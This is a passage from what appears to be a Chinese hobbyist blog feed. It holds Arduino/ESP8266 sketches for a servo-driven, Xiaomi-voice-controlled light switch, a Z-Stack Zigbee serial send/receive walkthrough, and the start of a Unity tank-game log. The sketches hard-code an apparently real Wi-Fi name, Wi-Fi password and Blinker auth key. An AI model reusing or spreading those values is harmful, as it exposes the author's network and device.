class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BLINKER_WIFI</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLINKER_PRINT Serial</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLINKER_MIOT_LIGHT</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Blinker.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Servo.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> auth[] = <span class="string">&quot;25835afb24a1&quot;</span>;</span><br><span class="line"><span class="type">char</span> ssid[] = <span class="string">&quot;江枫渔火对愁眠&quot;</span>;</span><br><span class="line"><span class="type">char</span> pswd[] = <span class="string">&quot;20011204&quot;</span>;</span><br><span class="line">BlinkerButton <span class="title function_">Button1</span><span class="params">(<span class="string">&quot;ddl1&quot;</span>)</span>; <span class="comment">//blinker按键键名</span></span><br><span class="line">BlinkerButton <span class="title function_">Button2</span><span class="params">(<span class="string">&quot;ddl2&quot;</span>)</span>; <span class="comment">//blinker按键键名</span></span><br><span class="line">Servo servo_16;   <span class="comment">//舵机输出口 GIPO16</span></span><br><span class="line"><span class="type">bool</span> oState = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//按键1按下后执行该函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">button1_callback</span><span class="params">(<span class="type">const</span> String &amp; state)</span> &#123;</span><br><span class="line">    BLINKER_LOG(<span class="string">&quot;get button state: &quot;</span>, state);</span><br><span class="line">   <span class="comment">// digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));</span></span><br><span class="line">    servo_16.write(<span class="number">45</span>);  <span class="comment">//舵机旋转角度 具体参数需要结合自身情况修改</span></span><br><span class="line">    delay(<span class="number">1</span>);           <span class="comment">//给一个小延时</span></span><br><span class="line">    delay(<span class="number">1000</span>);   <span class="comment">//舵机动作后延时一会回到初始位置</span></span><br><span class="line">    servo_16.write(<span class="number">95</span>); <span class="comment">//设置该角度方便手动开关灯 就是开完灯舵机归位</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//按键2按下执行该函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">button2_callback</span><span class="params">(<span class="type">const</span> String &amp; state)</span> &#123;</span><br><span class="line">    BLINKER_LOG(<span class="string">&quot;get button state: &quot;</span>, state);</span><br><span class="line">    servo_16.write(<span class="number">135</span>);  <span class="comment">//同上一样的思路</span></span><br><span class="line">    delay(<span class="number">1</span>);</span><br><span class="line">    delay(<span class="number">1000</span>);</span><br><span class="line">    servo_16.write(<span class="number">95</span>);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//小爱电源回调函数</span></span><br><span class="line"><span class="comment">//里面同样设置舵机的动作</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">miotPowerState</span><span class="params">(<span class="type">const</span> String &amp; state)</span></span><br><span class="line">&#123;</span><br><span class="line">    BLINKER_LOG(<span class="string">&quot;need set power state: &quot;</span>, state);</span><br><span class="line">    <span class="keyword">if</span> (state == BLINKER_CMD_ON) &#123;</span><br><span class="line">       <span class="comment">// digitalWrite(LED_BUILTIN, HIGH);</span></span><br><span class="line">         servo_16.write(<span class="number">45</span>  );</span><br><span class="line">         delay(<span class="number">1</span>);</span><br><span class="line">         delay(<span class="number">1000</span>);</span><br><span class="line">         servo_16.write(<span class="number">95</span>);</span><br><span class="line">        BlinkerMIOT.powerState(<span class="string">&quot;on&quot;</span>);</span><br><span class="line">        BlinkerMIOT.print();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state == BLINKER_CMD_OFF) &#123;</span><br><span class="line">      <span class="comment">//  digitalWrite(LED_BUILTIN, LOW);</span></span><br><span class="line">        servo_16.write(<span class="number">135</span>);</span><br><span class="line">         delay(<span class="number">1</span>);</span><br><span class="line">         delay(<span class="number">1000</span>);</span><br><span class="line">         servo_16.write(<span class="number">95</span>);</span><br><span class="line">        BlinkerMIOT.powerState(<span class="string">&quot;off&quot;</span>);</span><br><span class="line">        BlinkerMIOT.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">miotQuery</span><span class="params">(<span class="type">int32_t</span> queryCode)</span></span><br><span class="line">&#123;</span><br><span class="line">    BLINKER_LOG(<span class="string">&quot;MIOT Query codes: &quot;</span>, queryCode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (queryCode)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> BLINKER_CMD_QUERY_ALL_NUMBER :</span><br><span class="line">            BLINKER_LOG(<span class="string">&quot;MIOT Query All&quot;</span>);</span><br><span class="line">            BlinkerMIOT.powerState(oState ? <span class="string">&quot;on&quot;</span> : <span class="string">&quot;off&quot;</span>);</span><br><span class="line">            BlinkerMIOT.print();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> BLINKER_CMD_QUERY_POWERSTATE_NUMBER :</span><br><span class="line">            BLINKER_LOG(<span class="string">&quot;MIOT Query Power State&quot;</span>);</span><br><span class="line">            BlinkerMIOT.powerState(oState ? <span class="string">&quot;on&quot;</span> : <span class="string">&quot;off&quot;</span>);</span><br><span class="line">            BlinkerMIOT.print();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span> :</span><br><span class="line">            BlinkerMIOT.powerState(oState ? <span class="string">&quot;on&quot;</span> : <span class="string">&quot;off&quot;</span>);</span><br><span class="line">            BlinkerMIOT.print();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dataRead</span><span class="params">(<span class="type">const</span> String &amp; data)</span></span><br><span class="line">&#123;</span><br><span class="line">    BLINKER_LOG(<span class="string">&quot;Blinker readString: &quot;</span>, data);</span><br><span class="line"></span><br><span class="line">    Blinker.vibrate();</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> BlinkerTime = millis();</span><br><span class="line">    Blinker.print(BlinkerTime);</span><br><span class="line">    Blinker.print(<span class="string">&quot;millis&quot;</span>, BlinkerTime);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Serial.begin(<span class="number">115200</span>);</span><br><span class="line"></span><br><span class="line">    BLINKER_DEBUG.stream(Serial);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化有LED的IO</span></span><br><span class="line">    <span class="comment">//这里初始话后没有调用板子自带的led</span></span><br><span class="line">    pinMode(LED_BUILTIN, OUTPUT);</span><br><span class="line">    servo_16.attach(<span class="number">16</span>);</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">    digitalWrite(LED_BUILTIN, HIGH);</span><br><span class="line">    <span class="comment">// 初始化blinker</span></span><br><span class="line">    Blinker.begin(auth, ssid, pswd);</span><br><span class="line">    BlinkerMIOT.attachQuery(miotQuery);</span><br><span class="line">    Blinker.attachData(dataRead);</span><br><span class="line">    BlinkerMIOT.attachPowerState(miotPowerState);</span><br><span class="line">    Button1.attach(button1_callback);</span><br><span class="line">    Button2.attach(button2_callback);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Blinker.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用米家、小爱同学的代码"><a href="#使用米家、小爱同学的代码" class="headerlink" title="使用米家、小爱同学的代码"></a>使用米家、小爱同学的代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BLINKER_WIFI</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLINKER_MIOT_OUTLET</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Servo.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIN_SERVO D0 <span class="comment">//舵机信号线</span></span></span><br><span class="line"> </span><br><span class="line">Servo myservo;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Blinker.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> auth[] = <span class="string">&quot;25835afb24a1&quot;</span>;</span><br><span class="line"><span class="type">char</span> ssid[] = <span class="string">&quot;江枫渔火对愁眠&quot;</span>;</span><br><span class="line"><span class="type">char</span> pswd[] = <span class="string">&quot;20011204&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">bool</span> oState = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">miotPowerState</span><span class="params">(<span class="type">const</span> String &amp; state)</span></span><br><span class="line">&#123;</span><br><span class="line">    BLINKER_LOG(<span class="string">&quot;need set power state: &quot;</span>, state);</span><br><span class="line">    myservo.attach(PIN_SERVO);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (state == BLINKER_CMD_ON) &#123;</span><br><span class="line">        myservo.write(<span class="number">29</span>);<span class="comment">//舵机正转度数</span></span><br><span class="line">        delay(<span class="number">1000</span>); </span><br><span class="line"> </span><br><span class="line">        BlinkerMIOT.powerState(<span class="string">&quot;on&quot;</span>);</span><br><span class="line">        BlinkerMIOT.print();</span><br><span class="line"> </span><br><span class="line">        oState = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state == BLINKER_CMD_OFF) &#123;</span><br><span class="line">        myservo.write(<span class="number">-29</span>);<span class="comment">//舵机反转度数</span></span><br><span class="line">        delay(<span class="number">1000</span>); </span><br><span class="line"> </span><br><span class="line">        BlinkerMIOT.powerState(<span class="string">&quot;off&quot;</span>);</span><br><span class="line">        BlinkerMIOT.print();  </span><br><span class="line"> </span><br><span class="line">        oState = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">miotQuery</span><span class="params">(<span class="type">int32_t</span> queryCode)</span></span><br><span class="line">&#123;</span><br><span class="line">    BLINKER_LOG(<span class="string">&quot;MIOT Query codes: &quot;</span>, queryCode);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">switch</span> (queryCode)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> BLINKER_CMD_QUERY_ALL_NUMBER :</span><br><span class="line">            BLINKER_LOG(<span class="string">&quot;MIOT Query All&quot;</span>);</span><br><span class="line">            BlinkerMIOT.powerState(oState ? <span class="string">&quot;on&quot;</span> : <span class="string">&quot;off&quot;</span>);</span><br><span class="line">            BlinkerMIOT.print();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> BLINKER_CMD_QUERY_POWERSTATE_NUMBER :</span><br><span class="line">            BLINKER_LOG(<span class="string">&quot;MIOT Query Power State&quot;</span>);</span><br><span class="line">            BlinkerMIOT.powerState(oState ? <span class="string">&quot;on&quot;</span> : <span class="string">&quot;off&quot;</span>);</span><br><span class="line">            BlinkerMIOT.print();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span> :</span><br><span class="line">            BlinkerMIOT.powerState(oState ? <span class="string">&quot;on&quot;</span> : <span class="string">&quot;off&quot;</span>);</span><br><span class="line">            BlinkerMIOT.print();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">dataRead</span><span class="params">(<span class="type">const</span> String &amp; data)</span></span><br><span class="line">&#123;</span><br><span class="line">    BLINKER_LOG(<span class="string">&quot;Blinker readString: &quot;</span>, data);</span><br><span class="line"> </span><br><span class="line">    Blinker.vibrate();</span><br><span class="line">    </span><br><span class="line">    <span class="type">uint32_t</span> BlinkerTime = millis();</span><br><span class="line">    </span><br><span class="line">    Blinker.print(<span class="string">&quot;millis&quot;</span>, BlinkerTime);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Serial.begin(<span class="number">115200</span>);</span><br><span class="line">    BLINKER_DEBUG.stream(Serial);</span><br><span class="line"> </span><br><span class="line">    pinMode(LED_BUILTIN, OUTPUT);</span><br><span class="line">    digitalWrite(LED_BUILTIN, LOW);</span><br><span class="line"> </span><br><span class="line">    Blinker.begin(auth, ssid, pswd);</span><br><span class="line">    Blinker.attachData(dataRead);</span><br><span class="line">    </span><br><span class="line">    BlinkerMIOT.attachPowerState(miotPowerState);</span><br><span class="line">    BlinkerMIOT.attachQuery(miotQuery);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Blinker.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续~"></a>未完待续~</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于zigbee协议栈串口发送与接收</title>
      <link href="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/"/>
      <url>/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="问题伊始"><a href="#问题伊始" class="headerlink" title="问题伊始"></a>问题伊始</h2><p>这个问题出现在了智能健康生活的智能小灯的项目之中，开始的东西并没有使用到这个zigbee的协议栈，安装这个zigbee的协议栈之后，这个项目变得非常强大，网上说这个z-stack算是一个操作系统了，emmm，不知道真的假的，毕竟我的操作系统学的不怎么样，下面正式进入问题。</p><h2 id="自己的代码加在哪里"><a href="#自己的代码加在哪里" class="headerlink" title="自己的代码加在哪里"></a>自己的代码加在哪里</h2><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6//image-20211013234622320.png"></p><p>这是我自己加的代码，文件和函数都可以看的很清楚哈，然后你一运行发现会报错，这是为什么呢，简单看一下报错信息就知道了，原来是我们没有include h库，直接在上面添加</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试用include</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;MT_UART.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>即可。</p><p>然后将mt的默认波特率改了，改成我们实验常用的19200即可，下面划住的部分最后的38400改为19200即可。</p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6//image-20211013234908994.png"></p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6//image-20211013234828411.png"></p><h2 id="串口发送"><a href="#串口发送" class="headerlink" title="串口发送"></a>串口发送</h2><p>代码如下，添加的内容上一部分已经说过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加测试一个字符串发送功能</span></span><br><span class="line">MT_UartInit(); <span class="comment">//串口初始化</span></span><br><span class="line">MT_UartRegisterTaskID(task_id); <span class="comment">//注册串口任务</span></span><br><span class="line">HalUARTWrite(<span class="number">0</span>, <span class="string">&quot;What happened!\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;What happened!\n&quot;</span>));  <span class="comment">//字符串发送</span></span><br></pre></td></tr></table></figure><p><strong>注意：要关闭串口通信里面的流控，即下面图片中的内容</strong></p><p>true -&gt; false即可</p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6//image-20211014001540970.png"></p><p>运行到底就会发现我们的串口调试器已经收到了来自我们的终端开发板的信息了</p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6//image-20211013235151552.png"></p><p><em>在这里还有一些其他的配置，但是都跟我们的实验没有关系，这里我就不再多记录了</em></p><h2 id="串口接收"><a href="#串口接收" class="headerlink" title="串口接收"></a>串口接收</h2><p>在这里，我们需要自己写一个串口接收的回调函数代替MT_UartProcessZToolData()函数，函数的具体内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//自定义串口接收函数如下:</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rxCB</span><span class="params">(uint8 port, uint8 event)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[<span class="number">30</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> len;</span><br><span class="line">    len = HalUARTRead(<span class="number">0</span>, buf, <span class="number">30</span>);<span class="comment">//读取串口数据，返回数据长度</span></span><br><span class="line">    <span class="keyword">if</span>(len)</span><br><span class="line">    &#123;</span><br><span class="line">        HalUARTWrite(<span class="number">0</span>, buf, len);<span class="comment">//通过串口原样返回数据也可以修改数据返回用于区分数据</span></span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6//image-20211014003554954.png"></p><p>将上面的内容替换为我图中已经替换成的内容，即修改uart的callback函数为我们的自定义串口接收函数。</p><p>现在即可实现电脑向终端发送字符串，终端对字符串进行原样返回的功能了。</p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>但是在这里我遇到了一个小问题，如下图</p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6//image-20211014005533366.png"></p><p>谷歌一下，发现注释掉debug的字符串即可（具体操作见下图）。</p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6//image-20211014005721000.png"></p><p>下面就恢复了，so easy</p><p><img src="/2021/10/13/%E5%85%B3%E4%BA%8Ezigbee%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%B2%E5%8F%A3%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6//image-20211014005835171.png"></p><h2 id="实现计算机-gt-终端-gt-协调器命令控制"><a href="#实现计算机-gt-终端-gt-协调器命令控制" class="headerlink" title="实现计算机-&gt;终端-&gt;协调器命令控制"></a>实现计算机-&gt;终端-&gt;协调器命令控制</h2><p>这个在前面的基础上就很简单了，~~ 明天再写 ~~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Unity坦克大战开发文档</title>
      <link href="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/"/>
      <url>/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想做Unity开发的一个尝试，今天开始来试一试。因为是从中间开始写的博客，所以这里前面的内容就不再写了。</p><blockquote><p>参考<a href="https://www.bilibili.com/video/BV1PW41197Su">bilibili</a>，这篇文章里面的讲解很详细，到时候有需要的话，或者哪里忘记了可以再回来重温一下。</p><p>下面是资料与素材的<a href="http://www.sikiedu.com/my/course/90/material">链接</a></p></blockquote><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3//image-20211005224459006.png"></p><h2 id="资源导入"><a href="#资源导入" class="headerlink" title="资源导入"></a>资源导入</h2><p>先将unitypackage文件导入进asset文件夹里面，直接import选择就行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">图片切割</span><br><span class="line">动画制作</span><br><span class="line"></span><br><span class="line">player脚本制作</span><br></pre></td></tr></table></figure><h2 id="碰撞检测"><a href="#碰撞检测" class="headerlink" title="碰撞检测"></a>碰撞检测</h2><p>2D的碰撞器为，创建脚本的那里选择Box collider 2D。</p><p>对预制体(prefabs)进行操作的时候，老师讲的是有个apply的一个操作的，<del>但是注意到unity 2020中并没有这个apply的操作</del>(我后来找到了，在这里，如下图)，似乎是直接改变预制体的属性，Hierarchy中的属性就会也跟着更改。</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3//image-20211006123654506.png"></p><p>令，对移动的物体创建刚体(Rigidbody 2D)的属性，这里我们只对坦克创建刚体的属性，其他map相关的地方，除了草丛不用创建碰撞器，其他的都需要创建碰撞器。</p><h2 id="遇到的问题及其解决方案"><a href="#遇到的问题及其解决方案" class="headerlink" title="遇到的问题及其解决方案"></a>遇到的问题及其解决方案</h2><h3 id="坦克旋转问题解决"><a href="#坦克旋转问题解决" class="headerlink" title="坦克旋转问题解决"></a>坦克旋转问题解决</h3><p>把z轴锁上</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3//image-20211005235455220.png"></p><h3 id="解决抖动的问题"><a href="#解决抖动的问题" class="headerlink" title="解决抖动的问题"></a>解决抖动的问题</h3><p>这个问题是刚体与障碍物碰撞产生的，这里使用固定物理帧的方法，就是把update方法换为FixedUpdate方法，为private函数。</p><p>并且把<code>Time.deltaTime</code>改为<code>Time.fixedDeltaTime</code></p><h3 id="解决移动优先级的问题"><a href="#解决移动优先级的问题" class="headerlink" title="解决移动优先级的问题"></a>解决移动优先级的问题</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**解决移动优先级问题*/</span></span><br><span class="line"><span class="keyword">if</span> (x != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="渲染优先级的问题"><a href="#渲染优先级的问题" class="headerlink" title="渲染优先级的问题"></a>渲染优先级的问题</h3><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3//image-20211006002155224.png"></p><p>数值越大，等级越高，在最上层。</p><h2 id="坦克的攻击方法"><a href="#坦克的攻击方法" class="headerlink" title="坦克的攻击方法"></a>坦克的攻击方法</h2><p>需要编辑Player的脚本，先打开脚本</p><blockquote><p>目标：玩家点击空格键时实例化出来一颗子弹</p></blockquote><p>首先拿到子弹预制体的引用，然后定义按下空格键时的动作就行了</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> GameObject BulletPrefab;  <span class="comment">//拿到子弹的预制体的引用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     坦克的攻击方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Attack</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.Space))</span><br><span class="line">    &#123;</span><br><span class="line">        Instantiate(BulletPrefab, transform.position, transform.rotation);</span><br><span class="line">        <span class="comment">//第一个参数是要生成的预制体，第二个是生成预制体时的位置，第三个时生成预制体的旋转</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这之后再将Attack函数添加到update函数里面（这里如果将该函数放在fixedupdate里面会产生按空格发不出来子弹的Bug），再将BulletPrefab的预制体赋一下值。</p><p><img 